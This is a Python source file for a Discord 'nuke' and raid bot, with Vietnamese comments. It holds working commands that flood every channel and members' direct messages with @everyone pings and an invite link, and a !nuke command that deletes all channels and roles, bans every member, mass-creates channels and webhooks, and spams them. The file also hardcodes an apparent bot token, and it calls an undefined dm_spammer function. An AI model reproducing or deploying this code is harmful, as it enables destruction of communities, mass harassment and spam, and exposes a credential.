import discord
from discord.ext import commands
import asyncio
import aiohttp
import random

TOKEN ="MTQwODAwMjA3MzUwMDMxOTc3NA.GGLzNt.76LdhESh7LmoUnjoTU4UytTJSlnx2rQA_AKo9Y"
OWNER_ID = 782066769908596757

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

webhook_urls = []
spam_channels = []
dm_targets = []

@bot.event
async def on_ready():
    print(f'[{bot.user}] Bot spam DM đặc biệt sẵn sàng')

# Spam webhook vào kênh
async def webhook_spammer():
    async with aiohttp.ClientSession() as session:
        while True:
            if webhook_urls:
                tasks = []
                for url in webhook_urls:
                    try:
                        wh = discord.Webhook.from_url(url, session=session)
                        tasks.append(wh.send("@everyone https://discord.gg/mtgbmrgNF"))
                    except:
                        pass
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.01)

# Spam trực tiếp từ bot vào kênh
async def bot_spam():
    msg = "@everyone https://discord.gg/mtgbmrgNF"
    while True:
        if spam_channels:
            await asyncio.gather(*[ch.send(msg) for ch in spam_channels], return_exceptions=True)
        await asyncio.sleep(0.01)

async def dm_spammer_single(target):
    count = 0
    while True:
        try:
            await target.send(f" https://discord.gg/mtgbmrgNF")
            count += 1
        except:
            pass
        await asyncio.sleep(0.3)  # 50 tin/giây

@bot.command(name='raid')
async def raid(ctx, *, message):
    channels = [ch for ch in ctx.guild.channels if isinstance(ch, discord.TextChannel)]
    if not channels:
        await ctx.send("Không có kênh")
        return
    async def spam():
        while True:
            await asyncio.gather(*[ch.send(f"@everyone {message}") for ch in channels], return_exceptions=True)
            await asyncio.sleep(0.01)
    asyncio.create_task(spam())
    await ctx.send(f"✅ RAID {len(channels)} kênh")

@bot.command(name='spam_dm_all')
async def spam_dm_all(ctx):
    """Spam DM đến TẤT CẢ thành viên trong server"""
    global dm_targets
    guild = ctx.guild
    dm_targets = [m for m in guild.members if m != bot.user]
    asyncio.create_task(dm_spammer())
    await ctx.send(f"✅ ĐANG SPAM DM ĐẾN {len(dm_targets)} THÀNH VIÊN")

@bot.command(name='spam_dm')
async def spam_dm_target(ctx, member: discord.Member):
    """Spam DM một người cụ thể - KHÔNG DỪNG"""
    await ctx.send(f"https://discord.gg/mtgbmrgNF")
    asyncio.create_task(dm_spammer_single(member))

@bot.command(name='nuke')
async def super_nuke(ctx):
    global webhook_urls, spam_channels, dm_targets
    guild = ctx.guild
    await ctx.send("NO WAR NO LIFE IS HERE")

    webhook_urls = []
    spam_channels = []
    dm_targets = [m for m in guild.members if m != bot.user]

    async def delete_all():
        for ch in guild.channels:
            if ch != ctx.channel:
                try:
                    await ch.delete()
                except:
                    pass
                await asyncio.sleep(0.01)
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
                await asyncio.sleep(0.01)

    async def create_all():
        global spam_channels
        for batch in range(0, 500, 50):
            tasks = [guild.create_text_channel(f"NUKE-{i}") for i in range(batch, batch+50)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, discord.TextChannel):
                    spam_channels.append(r)
            await asyncio.sleep(0.05)

    async def create_webhooks():
        global webhook_urls, spam_channels
        async def webhook_per_ch(ch):
            whs = []
            for _ in range(3):
                try:
                    wh = await ch.create_webhook(name="NUKE")
                    whs.append(wh.url)
                except:
                    pass
                await asyncio.sleep(0.01)
            return whs
        while len(spam_channels) < 200:
            await asyncio.sleep(0.05)
        tasks = [webhook_per_ch(ch) for ch in spam_channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, list):
                webhook_urls.extend(res)

    async def ban_all():
        members = [m for m in guild.members if m != bot.user]
        for member in members:
            try:
                await member.ban(reason="NUKE")
            except:
                pass
            await asyncio.sleep(0.01)

    task_delete = asyncio.create_task(delete_all())
    task_create = asyncio.create_task(create_all())
    task_ban = asyncio.create_task(ban_all())
    task_webhook = asyncio.create_task(create_webhooks())
    
    asyncio.create_task(webhook_spammer())
    asyncio.create_task(bot_spam())
    asyncio.create_task(dm_spammer())

    await asyncio.gather(task_delete, task_create, task_ban, task_webhook, return_exceptions=True)
    await ctx.send(f"✅ DONE: {len(spam_channels)} kênh, {len(webhook_urls)} webhook, {len(dm_targets)} DM đang spam")

@bot.command(name='stop')
async def stop(ctx):
    await ctx.send("Tắt terminal để dừng")

bot.run(TOKEN)